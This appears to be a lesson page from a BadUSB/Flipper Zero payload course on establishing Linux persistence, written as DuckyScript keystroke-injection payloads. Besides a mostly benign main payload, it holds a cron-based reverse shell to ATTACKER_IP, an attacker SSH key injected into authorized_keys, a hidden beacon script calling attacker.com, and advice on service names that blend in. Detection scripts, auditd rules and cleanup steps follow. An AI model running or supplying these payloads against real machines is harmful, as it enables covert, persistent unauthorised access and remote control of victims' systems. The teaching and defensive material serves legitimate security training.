# FZ-I13: Linux Persistence

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I13 |
| **Name** | Linux Persistence |
| **Difficulty** | Intermediate |
| **Target OS** | Linux (Ubuntu, Debian, Fedora) |
| **Execution Time** | ~6 seconds |
| **Persistence** | Multiple methods |
| **MITRE ATT&CK** | T1053.003 (Cron), T1546.004 (Shell Profile) |

## What This Payload Does

Establishes persistence on Linux systems using multiple methods: cron jobs, shell profile modifications, and systemd user services. These techniques survive reboots and provide reliable callback mechanisms.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Linux Persistence
REM Target: Linux (Debian/Ubuntu/Fedora)
REM Action: Establishes persistent access
REM Persistence: Cron + Bashrc
REM Skill: Intermediate
REM WARNING: Modifies system configurations
REM =============================================

DELAY 2500

REM Open Terminal (Ctrl+Alt+T for most distros)
CTRL ALT t
DELAY 1500

REM Method 1: Cron job persistence
STRINGLN (crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'echo \$(date) >> /tmp/persist.txt'") | crontab -

REM Method 2: Bashrc persistence
STRINGLN echo 'echo "$(date) - Shell opened" >> /tmp/shell_log.txt' >> ~/.bashrc

REM Verify persistence
STRINGLN echo "=== PERSISTENCE INSTALLED ===" > /tmp/persist_status.txt
STRINGLN crontab -l >> /tmp/persist_status.txt 2>/dev/null
STRINGLN echo "" >> /tmp/persist_status.txt
STRINGLN tail -1 ~/.bashrc >> /tmp/persist_status.txt
```

---

## Linux Persistence Methods

### Method 1: Cron Jobs

```bash
# User crontab (no root needed)
crontab -e

# Cron timing format
# ┌───────────── minute (0 - 59)
# │ ┌───────────── hour (0 - 23)
# │ │ ┌───────────── day of month (1 - 31)
# │ │ │ ┌───────────── month (1 - 12)
# │ │ │ │ ┌───────────── day of week (0 - 6)
# │ │ │ │ │
# * * * * * command

# Special strings
@reboot     # Run at startup
@hourly     # Run every hour
@daily      # Run daily
@weekly     # Run weekly
```

**Cron Persistence Examples:**

```ducky
REM At every reboot
STRINGLN (crontab -l 2>/dev/null; echo "@reboot /path/to/payload.sh") | crontab -

REM Every 5 minutes
STRINGLN (crontab -l 2>/dev/null; echo "*/5 * * * * /path/to/beacon.sh") | crontab -

REM Daily at midnight
STRINGLN (crontab -l 2>/dev/null; echo "0 0 * * * /path/to/daily.sh") | crontab -
```

### Method 2: Shell Profile Files

| File | When Executed |
|------|---------------|
| ~/.bashrc | Every interactive non-login shell |
| ~/.bash_profile | Login shells |
| ~/.profile | Login shells (if no bash_profile) |
| ~/.zshrc | Zsh shells |
| /etc/profile | All users (requires root) |

```ducky
REM Add to bashrc
STRINGLN echo '/path/to/payload.sh &' >> ~/.bashrc

REM Add to profile
STRINGLN echo '/path/to/payload.sh &' >> ~/.profile

REM For zsh users
STRINGLN echo '/path/to/payload.sh &' >> ~/.zshrc
```

### Method 3: Systemd User Services

```ducky
STRINGLN mkdir -p ~/.config/systemd/user

STRINGLN cat << 'EOF' > ~/.config/systemd/user/persistence.service
STRINGLN [Unit]
STRINGLN Description=System Update Service
STRINGLN After=network.target
STRINGLN
STRINGLN [Service]
STRINGLN Type=simple
STRINGLN ExecStart=/bin/bash -c 'while true; do echo "$(date)" >> /tmp/heartbeat.txt; sleep 300; done'
STRINGLN Restart=always
STRINGLN
STRINGLN [Install]
STRINGLN WantedBy=default.target
STRINGLN EOF

STRINGLN systemctl --user daemon-reload
STRINGLN systemctl --user enable persistence.service
STRINGLN systemctl --user start persistence.service
```

### Method 4: XDG Autostart (Desktop Environments)

```ducky
STRINGLN mkdir -p ~/.config/autostart

STRINGLN cat << 'EOF' > ~/.config/autostart/update.desktop
STRINGLN [Desktop Entry]
STRINGLN Type=Application
STRINGLN Name=System Update
STRINGLN Exec=/path/to/payload.sh
STRINGLN Hidden=false
STRINGLN NoDisplay=false
STRINGLN X-GNOME-Autostart-enabled=true
STRINGLN EOF
```

---

## Payload Variations

### Reverse Shell Persistence

```ducky
REM Cron-based reverse shell (every 5 min)
STRINGLN (crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
```

### SSH Key Persistence

```ducky
REM Add attacker's SSH key
STRINGLN mkdir -p ~/.ssh
STRINGLN echo "ssh-rsa AAAA...attacker_public_key... attacker@host" >> ~/.ssh/authorized_keys
STRINGLN chmod 700 ~/.ssh
STRINGLN chmod 600 ~/.ssh/authorized_keys
```

### Beacon Persistence

```ducky
REM Create beacon script
STRINGLN cat << 'EOF' > /tmp/.update.sh
STRINGLN #!/bin/bash
STRINGLN while true; do
STRINGLN     curl -s "https://attacker.com/beacon?host=$(hostname)" > /dev/null
STRINGLN     sleep 3600
STRINGLN done
STRINGLN EOF
STRINGLN chmod +x /tmp/.update.sh

REM Add to cron
STRINGLN (crontab -l 2>/dev/null; echo "@reboot /tmp/.update.sh &") | crontab -
```

---

## Cross-Platform Comparison

### Windows Equivalent

```powershell
# Scheduled Task
schtasks /create /tn "Persist" /tr "payload.exe" /sc onlogon

# Registry Run Key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Persist" /d "payload.exe"
```

### macOS Equivalent

```bash
# Launch Agent
cat << EOF > ~/Library/LaunchAgents/com.persist.plist
<?xml version="1.0"?>
<plist version="1.0">
<dict>
    <key>Label</key><string>com.persist</string>
    <key>ProgramArguments</key>
    <array><string>/path/to/payload</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.persist.plist
```

### Android (Root Required)

```bash
# Init.d script
echo '#!/system/bin/sh
/path/to/payload &' > /system/etc/init.d/99persist
chmod 755 /system/etc/init.d/99persist
```

---

## Red Team Perspective

### Persistence Location Selection

| Method | Stealth | Reliability | Root Needed |
|--------|---------|-------------|-------------|
| User crontab | Medium | High | No |
| ~/.bashrc | Low | Medium | No |
| Systemd user | Medium | High | No |
| XDG autostart | Medium | Medium | No |
| /etc/cron.d | High | High | Yes |
| Systemd system | High | High | Yes |

### Naming Conventions

Good names that blend in:
- `update-manager`
- `apt-daily`
- `system-health`
- `gnome-keyring`
- `network-dispatcher`

### Attack Chain

```
Initial Access → Establish Persistence → Maintain Access → Further Exploitation
                         ↑
                     You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Crontab Modifications**
   - New entries in user/system crontabs
   - Unusual @reboot entries

2. **Shell Profile Changes**
   - Modifications to .bashrc, .profile
   - New commands appended

3. **Systemd Units**
   - New user services
   - Services with suspicious ExecStart

4. **XDG Autostart**
   - New .desktop files in autostart

### Detection Script

```bash
#!/bin/bash
echo "=== PERSISTENCE AUDIT ==="

echo -e "\n=== User Crontabs ==="
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u $user -l 2>/dev/null | grep -v "^#" | while read line; do
        [ -n "$line" ] && echo "$user: $line"
    done
done

echo -e "\n=== Recent Shell Profile Changes ==="
find /home -name ".bashrc" -o -name ".profile" -mtime -7 2>/dev/null

echo -e "\n=== User Systemd Services ==="
find /home -path "*/.config/systemd/user/*.service" 2>/dev/null

echo -e "\n=== XDG Autostart ==="
find /home -path "*/.config/autostart/*.desktop" 2>/dev/null

echo -e "\n=== SSH Authorized Keys ==="
find /home -name "authorized_keys" -exec wc -l {} \; 2>/dev/null
```

### Auditd Rules

```bash
# Monitor crontab changes
-w /var/spool/cron -p wa -k cron_persistence
-w /etc/crontab -p wa -k cron_persistence
-w /etc/cron.d -p wa -k cron_persistence

# Monitor shell profiles
-w /etc/profile -p wa -k shell_persistence
-w /etc/bashrc -p wa -k shell_persistence

# Monitor systemd user services
-w /home -p wa -k user_systemd
```

### Prevention

1. **File Integrity Monitoring**
   - Monitor shell profiles
   - Track crontab changes
   - Watch systemd directories

2. **Access Controls**
   - Restrict crontab access
   - Protect shell profiles

3. **Regular Audits**
   - Review cron jobs
   - Check startup services
   - Verify authorized_keys

---

## Cleanup

### Remove Persistence

```bash
# Remove cron entry
crontab -l | grep -v "persist" | crontab -

# Clean bashrc (manual review needed)
nano ~/.bashrc

# Remove systemd service
systemctl --user disable persistence.service
rm ~/.config/systemd/user/persistence.service
systemctl --user daemon-reload

# Remove autostart
rm ~/.config/autostart/malicious.desktop
```

---

## Practice Exercises

### Exercise 1: View Current Crontab
```ducky
STRINGLN crontab -l
```

### Exercise 2: Create Harmless Cron Entry
```ducky
STRINGLN (crontab -l 2>/dev/null; echo "0 * * * * echo 'hourly' >> /tmp/cron_test.txt") | crontab -
```

### Exercise 3: Check Systemd User Services
```ducky
STRINGLN systemctl --user list-unit-files --type=service
```

---

## Payload File

Save as `FZ-I13_Linux_Persistence.txt`:

```ducky
REM FZ-I13: Linux Persistence
DELAY 2500
CTRL ALT t
DELAY 1500
STRINGLN (crontab -l 2>/dev/null; echo "@reboot echo \$(date) >> /tmp/persist.txt") | crontab -
STRINGLN echo 'echo "$(date)" >> /tmp/shell.txt' >> ~/.bashrc
```

---

[← FZ-I12 iOS Shortcuts](FZ-I12_iOS_Shortcuts.md) | [Back to Intermediate](README.md) | [Next: FZ-I14 Process Enumeration →](FZ-I14_Process_Enumeration.md)
